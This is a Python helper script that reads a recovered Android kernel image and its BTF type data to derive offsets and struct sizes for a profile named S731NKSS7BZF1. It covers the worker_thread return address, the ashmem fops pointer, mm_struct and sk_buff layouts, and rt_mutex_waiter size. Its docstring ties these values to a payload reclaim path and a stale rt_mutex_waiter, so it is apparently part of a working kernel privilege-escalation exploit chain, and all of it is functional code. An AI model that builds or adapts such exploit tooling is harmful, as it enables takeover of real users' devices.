#!/usr/bin/env python3
"""Derive the remaining S731NKSS7BZF1 profile constants.

`derive_offsets.py` resolves the symbol based offsets and the common BTF
layouts.  This script resolves the few constants that are not plain symbols:

  * `SLIDE_TRACEFS_WORKER_CALLER_OFF` - the return address of the `bl
    schedule` inside `worker_thread`, decoded from the recovered ELF.
  * `ASHMEM_MISC_FOPS_OFF` - `ashmem_miscs` plus `offsetof(miscdevice, fops)`,
    cross checked against the pointer that is actually stored in `.data`.
  * `MM_STRUCT_SZ` - `sizeof(struct mm_struct)` from the target BTF, which is
    the distance between two `mm_struct` objects in their kmem_cache slab.
  * the `sk_buff` geometry used by the payload reclaim path.

It also hashes the byte content of the functions that decide the kernel stack
layout of the pselect fd-set copy (`core_sys_select`) and of the stale
`rt_mutex_waiter` (`rt_mutex_slowlock`).  Comparing those hashes against the
sibling r13s kernels proves that the stack layout - and therefore
`SLIDE_PSELECT_WORD_SHIFT` - is identical.
"""

import argparse
import hashlib
import json
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from derive_offsets import Btf, read_elf_symbols  # noqa: E402

BL_MASK = 0xFC000000
BL_OP = 0x94000000

# Functions whose stack layout the pselect word shift depends on.
STACK_LAYOUT_FUNCTIONS = (
    "core_sys_select",
    "do_select",
    "do_pselect",
    "rt_mutex_slowlock",
    "__rt_mutex_slowlock",
    "rt_mutex_setlock",
)


def read_sections(elf_data: bytes):
    e_shoff = struct.unpack_from("<Q", elf_data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", elf_data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", elf_data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", elf_data, 0x3E)[0]

    raw = []
    for i in range(e_shnum):
        base = e_shoff + i * e_shentsize
        fields = struct.unpack_from("<IIQQQQIIQQ", elf_data, base)
        raw.append(
            {
                "name_off": fields[0],
                "type": fields[1],
                "addr": fields[3],
                "offset": fields[4],
                "size": fields[5],
            }
        )

    strtab = raw[e_shstrndx]
    shstr = elf_data[strtab["offset"] : strtab["offset"] + strtab["size"]]
    for sec in raw:
        end = shstr.find(b"\0", sec["name_off"])
        sec["name"] = shstr[sec["name_off"] : end].decode("ascii", "replace")
    return raw


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("vmlinux", type=Path)
    parser.add_argument("btf", type=Path)
    parser.add_argument("--json", type=Path)
    args = parser.parse_args()

    elf_data = args.vmlinux.read_bytes()
    symbols = read_elf_symbols(args.vmlinux)
    btf = Btf(args.btf.read_bytes())

    base = min(
        (addr for addr in symbols.values() if addr >= 0xFFFFFFC000000000),
        default=0,
    ) & ~0xFFF

    sections = read_sections(elf_data)
    kernel_sec = None
    for sec in sections:
        if sec["name"] in (".kernel", ".text"):
            kernel_sec = sec
            break
    if kernel_sec is None:
        print("no .kernel/.text section in the recovered ELF")
        return 1

    sec_base = kernel_sec["addr"]
    sec_data = elf_data[kernel_sec["offset"] : kernel_sec["offset"] + kernel_sec["size"]]

    def image_bytes(offset: int, size: int) -> bytes:
        start = offset - (sec_base - base)
        if start < 0 or start + size > len(sec_data):
            raise ValueError(f"image range 0x{offset:x}+{size} outside the image")
        return sec_data[start : start + size]

    def image_u64(offset: int) -> int:
        return struct.unpack("<Q", image_bytes(offset, 8))[0]

    out = {
        "ELF_BASE": base,
        "IMAGE_SIZE": len(sec_data),
    }

    # ---------------------------------------------------------- worker caller
    worker = symbols.get("worker_thread")
    schedule = symbols.get("schedule")
    if worker is None or schedule is None:
        print("worker_thread/schedule not found in the symbol table")
        return 1

    later = sorted(addr for addr in symbols.values() if addr > worker)
    body_end = later[0] if later else worker + 0x2000
    body = image_bytes(worker - base, body_end - worker)

    calls = []
    for pos in range(0, len(body) - 3, 4):
        insn = struct.unpack_from("<I", body, pos)[0]
        if insn & BL_MASK != BL_OP:
            continue
        imm26 = insn & 0x03FFFFFF
        if imm26 & 0x02000000:
            imm26 -= 0x04000000
        target = worker + pos + (imm26 << 2)
        calls.append((worker + pos, target, target == schedule))

    print(f"worker_thread: 0x{worker:x} (offset 0x{worker - base:x})")
    print(f"schedule:      0x{schedule:x} (offset 0x{schedule - base:x})")
    for call_addr, target, is_schedule in calls:
        print(
            f"  bl 0x{target:x} at 0x{call_addr:x} "
            f"(offset 0x{call_addr - base:x})"
            + ("  <- schedule" if is_schedule else "")
        )

    schedule_calls = [call for call in calls if call[2]]
    if not schedule_calls:
        print("no 'bl schedule' inside worker_thread")
        return 1
    caller_off = (schedule_calls[0][0] + 4) - base
    out["SLIDE_TRACEFS_WORKER_CALLER_OFF"] = caller_off
    print(f"SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x{caller_off:x}")

    # ------------------------------------------------------------ ashmem misc
    misc_sym = None
    for name in ("ashmem_miscs", "ashmem_misc"):
        if name in symbols:
            misc_sym = name
            break
    if misc_sym is None:
        print("neither ashmem_miscs nor ashmem_misc is present in the symbol table")
        return 1

    misc_off = symbols[misc_sym] - base
    fops_member = btf.struct_member_offset("miscdevice", "fops")
    name_member = btf.struct_member_offset("miscdevice", "name")
    misc_fops_off = misc_off + fops_member
    out["ASHMEM_MISC_SYMBOL"] = misc_sym
    out["ASHMEM_MISC_OFF"] = misc_off
    out["ASHMEM_MISC_FOPS_OFF"] = misc_fops_off
    out["MISCDEVICE_FOPS_OFF"] = fops_member
    out["MISCDEVICE_NAME_OFF"] = name_member
    out["SIZEOF_MISCDEVICE"] = btf.struct_size("miscdevice")

    stored = image_u64(misc_fops_off)
    ashmem_fops = symbols.get("ashmem_fops")
    print(f"{misc_sym}: 0x{misc_off:x} (+0x{fops_member:x} -> fops)")
    print(f"  stored fops pointer: 0x{stored:x}")
    if ashmem_fops is not None:
        print(f"  ashmem_fops:         0x{ashmem_fops:x}")
        if stored != ashmem_fops:
            print("  WARNING: stored pointer does not match ashmem_fops")
            out["ASHMEM_MISC_FOPS_VERIFIED"] = False
        else:
            out["ASHMEM_MISC_FOPS_VERIFIED"] = True
    stored_name = image_u64(misc_off + name_member)
    print(f"  stored name pointer: 0x{stored_name:x}")
    if stored_name:
        try:
            text = image_bytes(stored_name - base, 32)
            name_text = text.split(b"\0")[0].decode("ascii", "replace")
            print(f"  name string: {name_text}")
            out["ASHMEM_MISC_NAME"] = name_text
        except ValueError:
            pass

    # ------------------------------------------------------------- mm_struct
    try:
        mm_size = btf.struct_size("mm_struct")
        out["SIZEOF_MM_STRUCT"] = mm_size
        out["MM_STRUCT_SZ"] = mm_size
        print(f"sizeof(struct mm_struct) = 0x{mm_size:x}")
        for member in ("mm_users", "mm_count", "owner", "pgtables", "next", "prev"):
            try:
                off = btf.struct_member_offset("mm_struct", member)
                out[f"MM_STRUCT_{member.upper()}_OFF"] = off
                print(f"  mm_struct.{member} = 0x{off:x}")
            except (KeyError, ValueError):
                pass
    except KeyError as exc:
        print(f"mm_struct not in BTF: {exc}")
        return 1

    # ---------------------------------------------------------------- sk_buff
    try:
        out["SIZEOF_SKB"] = btf.struct_size("sk_buff")
        print(f"sizeof(struct sk_buff) = 0x{out['SIZEOF_SKB']:x}")
        for member in ("head", "data", "tail", "end", "len", "next", "prev"):
            try:
                off = btf.struct_member_offset("sk_buff", member)
                out[f"SKB_{member.upper()}_OFF"] = off
                print(f"  sk_buff.{member} = 0x{off:x}")
            except (KeyError, ValueError):
                pass
    except KeyError as exc:
        print(f"sk_buff not in BTF: {exc}")

    # --------------------------------------------------- stack layout hashes
    layout = {}
    for name in STACK_LAYOUT_FUNCTIONS:
        addr = symbols.get(name)
        if addr is None:
            continue
        nxt = sorted(a for a in symbols.values() if a > addr)
        end = nxt[0] if nxt else addr + 0x2000
        try:
            blob = image_bytes(addr - base, end - addr)
        except ValueError:
            continue
        layout[name] = {
            "offset": addr - base,
            "size": end - addr,
            "sha256": hashlib.sha256(blob).hexdigest(),
        }
        print(
            f"{name}: offset 0x{addr - base:x} size 0x{end - addr:x} "
            f"sha256 {layout[name]['sha256'][:16]}"
        )
    out["STACK_LAYOUT_FUNCTIONS"] = layout

    # ------------------------------------------------------------- rt_mutex
    try:
        out["SIZEOF_RT_MUTEX_WAITER"] = btf.struct_size("rt_mutex_waiter")
        print(f"sizeof(struct rt_mutex_waiter) = 0x{out['SIZEOF_RT_MUTEX_WAITER']:x}")
    except KeyError:
        pass

    text = json.dumps(out, indent=2, sort_keys=True)
    if args.json:
        args.json.write_text(text + "\n")
    print()
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
